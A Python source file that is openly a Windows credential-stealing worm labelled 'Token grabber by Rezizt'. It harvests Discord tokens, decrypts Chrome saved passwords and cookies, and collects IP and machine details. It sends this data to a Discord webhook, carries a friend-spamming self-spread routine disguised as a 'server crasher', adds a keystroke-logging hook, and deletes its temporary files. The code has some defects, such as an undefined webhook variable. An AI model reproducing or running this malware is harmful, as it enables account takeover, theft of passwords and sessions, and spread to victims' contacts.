import os
if os.name != "nt":
    exit()
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from codecs import encode
import getpass
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
from pathlib import Path
from discord_webhook import DiscordWebhook, DiscordEmbed
import requests
import random
import sys
from pynput.keyboard import Key, Listener

ext = {"webhook": "ChangeMe", "webhook-name": "ChangeMe"}


LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getdeveloper():
    dev = "wodx"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
    except:
        pass
    return dev
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getfriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
    except:
        pass
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def spread(token, form_data, delay):
    return # Remove to re-enabled
    for friend in getfriends(token):
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)

       
def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    developer = getdeveloper()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    },
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": f"Token grabber by Rezizt"
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Rezizt tf you doing",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request(webhook, data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
try:
    main()
except Exception as e:
    print(e)
    pass

def get_master_key():
    # this finds the key needed to decrypt the Local Data passwords
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    # iterate through the file and find the key which is to the right of os_crypt
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1] # sqlite3 decryption
    try:
        return master_key # return the key in plain text
    except:
        exit()

def decrypt_payload(cipher, payload):
    try:
        return cipher.decrypt(payload)
    except:
        pass

def generate_cipher(aes_key, iv):
    try:
        return AES.new(aes_key, AES.MODE_GCM, iv)
    except:
        pass

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        try:
            return decrypted_pass
        except:
            pass
    
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        decrypted_pass = win32crypt.CryptUnprotectData(buff, None, None, None, 0) #Tuple
        return str(decrypted_pass[1])


if __name__ == '__main__':

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        # grab the needed information
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        # make a local file with the login data
        passfile = open("passwords.txt", "w")
        for r in cursor.fetchall():
            # these 2 are already in plain text
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            # now decrypt the password using the master key via AES encryption / decryption
            decrypted_password = decrypt_password(encrypted_password, master_key)
            #print("URL: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
            # sort it and make it look more organised
            passfile.write("URL: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
        # finish the files
        passfile.close()
        conn.close()

    except Exception as e:
        pass
    
def get_master_key():
    # this finds the key needed to decrypt the Local Data passwords
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    # iterate through the file and find the key which is to the right of os_crypt
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1] # sqlite3 decryption
    return master_key # return the key in plain text

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_cookies(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_cook = decrypt_payload(cipher, payload)
        decrypted_cook = decrypted_cook[:-16].decode()  # remove suffix bytes
        return decrypted_cook

    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        decrypted_cook = win32crypt.CryptUnprotectData(buff, None, None, None, 0) #Tuple
        return str(decrypted_cook[1])


if __name__ == '__main__':

    master_key = get_master_key()
    try:
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute('SELECT encrypted_value,host_key,name FROM Cookies;')
    except:
        pass
    try:
        # grab the needed information
        cursor.execute('SELECT encrypted_value,host_key,name FROM Cookies;')
        # make a local file with the login data
        passfile = open('cookies' + '.txt', "w")
        for r in cursor.fetchall():
            # these 2 are already in plain text
            url = r[1]
            username = r[2]
            encrypted_cookies = r[0]
            # now decrypt the password using the master key via AES encryption / decryption
            decrypted_cookies = decrypt_cookies(encrypted_cookies, master_key)
            #print("URL: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_cookies + "\n" + "*" * 50 + "\n")
            # sort it and make it look more organised
            passfile.write("URL: " + url + "\nWebsite: " + username + "\nCookie: " + decrypted_cookies + "\n" + "-" * 50 + "\n")
        # finish the files
        passfile.close()
        conn.close()

    except Exception as e:
        print(e)

webhook = DiscordWebhook(url=webhook, username="Passwords and cookies") 

def on_press(key):
    webhook = DiscordWebhook(url=ext['webhook'], content=f"| Date: {today} | KEY: {str(key)} | PC name: {pcname} |",  username=ext['webhook-name'])
    response = webhook.execute()


def listener_s():
    with Listener(on_press=on_press) as listener:
        listener.join()

# send two images
with open("cookies.txt", "rb") as f:
    webhook.add_file(file=f.read(), filename='cookies.txt')
with open("passwords.txt", "rb") as f:
    webhook.add_file(file=f.read(), filename='passwords.txt')

response = webhook.execute()

os.remove("cookies.txt")
os.remove("passwords.txt")
os.remove("Loginvault.db")
